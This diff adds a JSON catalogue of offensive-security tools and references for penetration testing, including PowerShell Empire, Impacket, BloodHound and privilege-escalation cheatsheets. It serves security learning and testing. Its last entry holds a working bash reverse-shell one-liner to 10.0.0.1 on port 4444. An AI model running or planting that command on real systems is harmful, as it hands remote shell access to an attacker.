@@ -1,0 +1,47 @@
+[
+  {
+    "id": "powershell-empire",
+    "name": "PowerShell Empire",
+    "description": "A post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.",
+    "link": "https://github.com/BC-SECURITY/Empire",
+    "tags": ["Windows", "Post-Exploitation", "PowerShell"]
+  },
+  {
+    "id": "impacket",
+    "name": "Impacket",
+    "description": "A collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets.",
+    "link": "https://github.com/fortra/impacket",
+    "tags": ["Linux", "Networking", "Python"]
+  },
+  {
+    "id": "bloodhound",
+    "name": "BloodHound",
+    "description": "Visually explore Active Directory trust relationships and find attack paths. An essential tool for AD penetration testing.",
+    "link": "https://github.com/BloodHoundAD/BloodHound",
+    "tags": ["Windows", "Active Directory", "Graph Theory"]
+  },
+  {
+    "id": "linux-privesc-payloads",
+    "name": "Linux Privesc Payloads",
+    "description": "A collection of payloads for Linux privilege escalation, categorized by technique.",
+    "link": "https://github.com/GTFOBins/GTFOBins.github.io", 
+    "type": "payload",
+    "tags": ["Linux", "Privilege Escalation", "Payload"]
+  },
+  {
+    "id": "windows-privesc-cheatsheet",
+    "name": "Windows Privesc Cheatsheet",
+    "description": "A comprehensive cheatsheet of Windows privilege escalation techniques, including commands and tools.",
+    "link": "https://www.ired.team/offensive-security/privilege-escalation/t1068-exploit-public-facing-application",
+    "type": "cheatsheet",
+    "tags": ["Windows", "Privilege Escalation", "Cheatsheet"]
+  },
+  {
+    "id": "reverse-shell-cheatsheet",
+    "name": "Reverse Shell Cheatsheet",
+    "description": "A collection of reverse shell one-liners for various languages and platforms.",
+    "code": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "type": "payload",
+    "tags": ["Linux", "Web", "Reverse Shell"]
+  }
+]
